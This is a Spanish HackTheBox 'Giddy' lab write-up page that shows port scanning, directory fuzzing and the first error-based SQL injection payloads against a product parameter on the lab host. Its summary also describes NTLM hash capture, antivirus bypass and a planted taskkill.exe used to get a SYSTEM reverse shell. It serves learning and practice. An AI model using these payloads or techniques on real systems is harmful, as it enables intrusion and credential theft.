@@ -1,0 +1,3132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Giddy</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Giddy | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Giddy" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder) para obtener cositas (hashes). Y jugaremos a bypassear antivirus, Windows Defender y App Lockers para subir binarios maliciosos (o quizás no tan maliciosos e incluso sutiles como dos líneas de código)." />
+<meta property="og:description" content="Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder) para obtener cositas (hashes). Y jugaremos a bypassear antivirus, Windows Defender y App Lockers para subir binarios maliciosos (o quizás no tan maliciosos e incluso sutiles como dos líneas de código)." />
+<link rel="canonical" href="http://localhost:4000/htb/giddy" />
+<meta property="og:url" content="http://localhost:4000/htb/giddy" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-27T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" />
+<meta property="twitter:title" content="HackTheBox - Giddy" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-07-27T00:00:00-07:00","datePublished":"2021-07-27T00:00:00-07:00","description":"Máquina Windows nivel medio. Jugaremos con inyecciones SQL del servicio MSSQL. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (smbclient y responder) para obtener cositas (hashes). Y jugaremos a bypassear antivirus, Windows Defender y App Lockers para subir binarios maliciosos (o quizás no tan maliciosos e incluso sutiles como dos líneas de código).","headline":"HackTheBox - Giddy","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/giddy"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/giddy"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Giddy</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-07-27">27 Jul 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153banner.png" alt="HackTheBox - Giddy">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio. Jugaremos con <strong>inyecciones SQL</strong> del servicio <strong>MSSQL</strong>. Pero no vamos dumpear bases de datos, nop, vamos a ejecutar comandos :o que serán interceptados (<strong>smbclient</strong> y <strong>responder</strong>) para obtener cositas (<strong>hashes</strong>). Y jugaremos a bypassear <strong>antivirus</strong>, <strong>Windows Defender</strong> y <strong>App Lockers</strong> para subir binarios maliciosos (o quizás no tan maliciosos e incluso sutiles como dos líneas de código).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153giddyHTB.png" alt="153giddyHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/709">lkys37en</a>.</p>
+
+<p>¡Una bestialidad ehh!</p>
+
+<p>Máquina, máquinita, máquinota. Vamos inicialmente a jugar con un servidor web que mantiene dos recursos, una <code>PowerShell Web</code> y apartado con muuuchos productos, jugando con este último llegaremos a una <strong>inyección SQL basada en errores</strong>, esto en el servicio <code>Microsoft SQL Server</code>.</p>
+
+<p>Nos crearemos un liiiindo script para dumpear toda la data que queramos con respecto a <strong>variables del sistema</strong>, <strong>tablas</strong>, <strong>columnas</strong>, etc.</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/giddy/extract_data_sqli.py">extract_data_sqli.py</a></p>
+</blockquote>
+
+<p>Enumerando las bases de datos no encontraremos nada relevante, pasaremos a inyectar comandos del propio <code>MSSQL</code>, jugando con esto llegaremos a la función <a href="https://www.patrickkeisler.com/2012/11/how-to-use-xpdirtree-to-list-all-files.html">xp_dirtree</a>, la usaremos para por medio de la herramienta <code>responder</code> interceptar un hash <code>Net-NTLMv2</code> del usuario <strong>Stacy</strong>.</p>
+
+<p>Crackeando el hash conseguiremos una contraseña, haciendo reutilización de contraseñas y con la ayuda de <code>evil-winrm</code> obtendremos una sesión en la máquina como <strong>Stacy</strong>.</p>
+
+<p>Encontraremos un servicio llamado <code>unifi-video</code> en el sistema, enumerando veremos una vulnerabilidad relacionada que permite escalar privilegios, esto debido a que una vez el servicio es detenido o iniciado va a intentar ejecutar un objeto llamado <code>taskkill.exe</code> de la ruta raíz del programa.</p>
+
+<p>Podemos aprovecharnos de nuestros permisos para agregar un binario <code>taskkill.exe</code> con contenido malicioso en esa ruta y hacer que el servicio lo ejecute.</p>
+
+<p><strong>PEEEEEROOO</strong> no va a ser tan sencillo, ya que hay varias barreras, posiblemente exista un antivirus, el mismo <code>Windows Defender</code> o un <code>App Locker</code> bloqueando binarios por doquier.</p>
+
+<p>Jugando con <code>phantom-evasion</code> (no nos funciona para la explotación final) para evadir antivirus logramos hacer el bypass pero no la obtención de una <strong>Shell</strong>.</p>
+
+<p>Finalmente nos crearemos un script que ejecute el binario <code>nc.exe</code>, lo compilaremos con ayuda de <code>mingw-w64</code> y lo nombraremos <code>taskkill.exe</code>, jugando y jugando lograremos que el servicio ejecute ese archivo y obtendremos una Reverse Shell enviada por <strong>nc</strong> hacia nuestra máquina como el usuario <code>NT authority system</code>.</p>
+
+<p>…</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Bastaaaaaante real y con vulnerabilidades conocidas, estas máquinas son fascinantes.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>Es tu momento de brillar, disfruta cada instante.</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+      <li><a href="#puerto-80">Recorremos el servicio web del puerto 80 y el del puerto 443</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación, encontramos inyección SQL basada en errores</a>.
+    <ul>
+      <li><a href="#mvc-sqli-orderby">Jugamos con <u>ORDER BY</u> para extraer el número concreto de columnas mediante la <strong>SQLi</strong></a>.</li>
+      <li><a href="#mvc-sqli-union-hola">De las <strong>25</strong> columnas, vemos en cuáles podemos almacenar texto</a>.</li>
+      <li><a href="#mvc-sqli-dbs">Extraemos las <strong>bases de datos</strong> del servicio <strong>MSSQL</strong></a>.</li>
+      <li><a href="#mvc-sqli-exec">Jugando con comandos de <strong>MSSQL</strong> para conectarnos a una carpeta compartida y extraer hashes <strong>Net-NTLMv2</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios, explotamos el servicio <strong>unifi-video</strong></a>.
+    <ul>
+      <li><a href="#msfvenom-taskkillexe">Generamos archivo <strong>taskkill.exe</strong> malicioso</a>.</li>
+      <li><a href="#find-service-unifivideo">Buscamos servicio del sistema relacionado a <strong>unifi-video</strong></a>.</li>
+      <li><a href="#trying-service-taskkillexe">Intentamos que el servicio <strong>unifi-video</strong> ejecute <strong>taskkill.exe</strong> (binario malicioso)</a>.</li>
+      <li><a href="#bypass-av-and-things">Evadimos <strong>Antivirus</strong>, <strong>Windows Defender</strong>, <strong>App Locker</strong> y lo que se venga</a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<hr />
+
+<h3 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">🔗</a></h3>
+
+<p>Veamos inicialmente que puertos tiene activos la máquina, así sabremos por donde empezar a tirar hilos:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.104 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Nos responde:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.104
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.104 ()	Status: Up
+Host: 10.10.10.104 ()	Ports: 80/open/tcp//http///, 443/open/tcp//https///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (65532)
+# Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 280.46 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos brinda un servidor web.</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_seguro_de_transferencia_de_hipertexto">HTTPS</a></strong>: Le agrega un certificado SSL para hacer “más fuerte” la seguridad de una web.</td>
+    </tr>
+    <tr>
+      <td>3389</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/pentesting-rdp">ms-wbt-server</a></strong>: Al parecer es un puerto que nos provee con una interfaz gráfica para conectarnos a otros dispositivos. Confirmémoslo con el siguiente escaneo.</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td style="text-align: left"><strong><a href="https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/">WinRM</a></strong>: Que nos permite realizar tareas administrativas remotamente (en pocas palabras)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Teniendo los puertos, juguemos con un escaneo de versiones y scripts, así vemos más a detalle la info de cada puerto.</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.104
+    [*] Open ports: 80,443,3389,5985
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,43,3389,5985 -sC -sV 10.10.10.104 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Fri Jul 23 25:25:25 2021 as: nmap -p 80,443,3389,5985 -sC -sV -oN portScan 10.10.10.104
+Nmap scan report for 10.10.10.104
+Host is up (0.11s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2021-07-23T15:29:02+00:00
+| ssl-cert: Subject: commonName=Giddy
+| Not valid before: 2021-05-03T14:56:04
+|_Not valid after:  2021-11-02T14:56:04
+|_ssl-date: 2021-07-23T15:29:06+00:00; +5m26s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5m25s, deviation: 0s, median: 5m25s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 20.24 seconds
+</code></pre>
+
+<p>Tenemos algunas cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">443</td>
+      <td style="text-align: left">HTTPS</td>
+      <td style="text-align: left">Microsoft IIS httpd 10.0</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Vemos un <code>commonName</code> muy atractivo:</p>
+
+<ul>
+  <li><code>commonName=PowerShellWebAccessTestWebSite</code></li>
+</ul>
+
+<p>Nos da la idea de tener una Shell en la web, ya veremos.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">3389</td>
+      <td style="text-align: left">RDP</td>
+      <td style="text-align: left">Microsoft Terminal Services</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Muchas referencias al nombre <strong>Giddy</strong> (mayusculas y minusculas)</p>
+
+<ul>
+  <li><code>DNS_Computer_Name: Giddy</code></li>
+</ul>
+
+<p>Jmmm, pues empecemos a explorar cada puerto y descubramos por donde podemos romperlos.</p>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">🔗</a></h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Un perrito :D de primeras se me ocurre algo con <strong>estenografía</strong> (ojalá no), pero sigamos explorando… Hagamos un fuzzeo de directorios a ver si algo se nos escapa de los ojos:</p>
+
+<pre><code class="language-bash">❱ dirsearch.py -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.10.104
+...
+Target: http://10.10.10.104/
+
+[25:25:25] Starting: 
+[25:25:25] 301 -  157B  - /aspnet_client  -&gt;  http://10.10.10.104/aspnet_client/
+[25:25:25] 302 -  157B  - /remote  -&gt;  /Remote/default.aspx?ReturnUrl=%2fremote
+[25:25:25] 301 -  157B  - /Aspnet_client  -&gt;  http://10.10.10.104/Aspnet_client/
+[25:25:25] 301 -  147B  - /mvc  -&gt;  http://10.10.10.104/mvc/
+[25:25:25] 301 -  157B  - /aspnet_Client  -&gt;  http://10.10.10.104/aspnet_Client/
+[25:25:25] 302 -  157B  - /Remote  -&gt;  /Remote/default.aspx?ReturnUrl=%2fRemote
+[25:25:25] 301 -  157B  - /ASPNET_CLIENT  -&gt;  http://10.10.10.104/ASPNET_CLIENT/
+[25:25:25] 400 -  324B  - /besalu%09
+[25:25:25] 400 -  324B  - /error%1F_log
+...
+</code></pre>
+
+<p>Opaa, encontramos tres rutas:</p>
+
+<ul>
+  <li><code>/aspnet_client</code>.</li>
+  <li><code>/remote</code>.</li>
+  <li><code>/mvc</code>.</li>
+</ul>
+
+<p>Validando cada una, <code>/aspnet_client</code> nos devuelve <code>acceso denegado</code> :( si revisamos <code>/remote</code>, con ella si obtenemos respuesta y caemos acá:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_remote.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Perefeto, nos pide varias cosas, pero la principal es que nos movamos al servicio <strong>HTTPS</strong>, así que nos movemos a:</p>
+
+<ul>
+  <li><code>https://10.10.10.104/remote</code></li>
+</ul>
+
+<p>Y conseguimos el mismo output, pero sin el error del <strong>SSL</strong> (: Juguemos con el login a ver…</p>
+
+<blockquote>
+  <p><code>Windows PowerShell Web Access</code> (que llamaremos <strong>PSWA</strong>): “acts as a Windows PowerShell gateway, providing a <strong>web-based Windows PowerShell console</strong> that is targeted at a remote computer. It enables IT Pros to run Windows PowerShell commands and scripts from a Windows PowerShell console in a web browser, with no Windows PowerShell, remote management software, or browser plug-in installation necessary on the client device.” <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh831611(v=ws.11)">Install and Use Windows PowerShell Web Access</a>.</p>
+</blockquote>
+
+<ul>
+  <li><a href="https://practical365.com/powershell-web-access-just-how-practical-is-it/">How to use Microsoft PowerShell Web Access</a>.</li>
+</ul>
+
+<p>Intentando algunas cositas como buscar <code>Windows PowerShell Web Access exploit</code> o credenciales por default, no conseguimos nada útil.</p>
+
+<p>Si nos fijamos ya sea con la extensión <code>Wappalyzer</code> de Firefox o con la herramienta <code>whatweb</code> vemos algo de <code>asp.net</code>:</p>
+
+<pre><code class="language-bash">❱ whatweb https://10.10.10.104/remote
+https://10.10.10.104/remote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/default.aspx?ReturnUrl=%2fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+
+https://10.10.10.104/Remote/default.aspx?ReturnUrl=%2fremote [302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[/Remote/en-US/logon.aspx?ReturnUrl=%252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+
+https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%252fremote [302 Found] ASP_NET[4.0.30319], Cookies[.redirect.], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.redirect.], IP[10.10.10.104], Microsoft-IIS[10.0], RedirectLocation[https://10.10.10.104/Remote/en-US/logon.aspx?ReturnUrl=%25252fremote], Title[Object moved], X-Frame-Options[DENY], X-Powered-By[ASP.NET]
+</code></pre>
+
+<p>Contamos con la versión <code>4.0.30319</code> de <code>asp.net</code>, buscando cositas en la web con esto tampoco llegamos a nada interesante o relevante :(</p>
+
+<p>…</p>
+
+<p>Veamos la ruta <code>/mvc</code> de la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Ufff, muchos recursos (si nos fijamos a la derecha del todo aún quedan varios scrolls hacia abajo y todo son links), notamos varias cositas:</p>
+
+<ul>
+  <li>Un botón de <strong>registro</strong>: <code>http://10.10.10.104/mvc/Account/Register.aspx</code>.</li>
+  <li>Un botón de <strong>login</strong>: <code>http://10.10.10.104/mvc/Account/Login.aspx</code>.</li>
+  <li>4 botones más, los 4 funcionales:
+    <ul>
+      <li><code>http://10.10.10.104/mvc/About.aspx</code>.</li>
+      <li><code>http://10.10.10.104/mvc/Contact.aspx</code>.</li>
+      <li><code>http://10.10.10.104/mvc/Search.aspx</code>.</li>
+    </ul>
+  </li>
+  <li>Los links que hacen referencia a nombres de productos tienen este formato:
+    <ul>
+      <li><code>http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=12</code>, donde <strong>12</strong> puede ser cualquier número (o sea, cualquier producto).</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Vaya, varias cositas para probar (eso de los productos tiene una cara de <strong>SQLi</strong> que ufff), pero vamos por orden.</p>
+
+<p>Si nos creamos una cuenta, nos inicia sesión de una. Curiosamente no hay nada distinto a lo que vimos ya.</p>
+
+<p>Jugando con el apartado <code>Search.aspx</code> tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Si insertamos algo como <code>&lt;h1&gt;Hola&lt;/h1&gt;</code>, para saber si podemos inyectar código HTML nos responde esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_search_errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos devuelve un error, pero además de eso vemos varias cositas, como una ruta absoluta y algunas versiones que están siendo usadas con el servicio. Probando algo más interesante como inyectar consultas <strong>SQL</strong> no logramos nada, usamos estos dos payloads como base, de ellos vamos probando variaciones:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Payload</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>1 order by 100</code></td>
+      <td style="text-align: left">Así intentamos determinar cuantas columnas hay en la consulta actual, como ejemplo intentamos <strong>100</strong> columnas, si no existe ese número de columnas nos debería responder con un error, si llega el error sabemos que es vulnerable y debemos empezar a restar al <strong>100</strong> para encontrar el número de columnas (cuando ya no existan errores, tendremos el num de cols).</td>
+    </tr>
+    <tr>
+      <td><code>1 or sleep(5)</code></td>
+      <td style="text-align: left">Para ver si existe una vulnerabilidad <strong>SQL</strong> basada en tiempo (si la consulta se demora 5 segundos en responder, sabríamos que es vulnerable).</td>
+    </tr>
+    <tr>
+      <td><code>;#</code></td>
+      <td style="text-align: left">Hace referencia a un comentario (hay varias maneras), por lo que le decimos que tome toooooooodo lo que este después de nuestro payload como comentario para que no interfiera con nuestra explotación</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Pero lo dicho, jugando con <code>Search.aspx</code> con algunos payloads no llegamos a ningún lado, así que movámonos a los productos.</p>
+
+<p>Seleccionamos cualquiera, por ejemplo el <strong>33</strong> que hace referencia a las <em>luces</em>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_light.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Bien, si jugamos con las columnas, encontramos algooooooooooooooooooooooo:</p>
+
+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 100;#
+</code></pre>
+
+<blockquote>
+  <p>33, 1, 2 o 234, da igual el numero.</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Opaaaaaaa, confirmamos <strong>inyección SQL</strong> (: vemos el error que nos indica que <strong>100</strong> está fuera de rango del número de columnas, así que debemos empezar a bajar el número y ver en que momento dejamos de ver el error.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order100_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>También vemos las versiones de antes, pero ahora hay una nueva ruta, y esta parecer ser donde residen todos los archivos del servicio web (: sigamos con la <strong>SQLi</strong>…</p>
+
+<blockquote>
+  <p>Y un nuevo usuario, <code>jnogueira</code>, guardemoslo.</p>
+</blockquote>
+
+<p>…</p>
+
+<h2 id="explotacion">Jugamos con la <u>inyección SQL</u> <a href="#explotacion">#</a></h2>
+
+<hr />
+
+<h3 id="mvc-sqli-orderby">Encontramos número de columnas usando <u>ORDER BY</u> <a href="#mvc-sqli-orderby">🔗</a></h3>
+
+<p>Moviendo números encontramos el límite:</p>
+
+<pre><code class="language-html">http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=33 order by 26;#
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/giddy/153page80_mvc_SQLi_order26.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
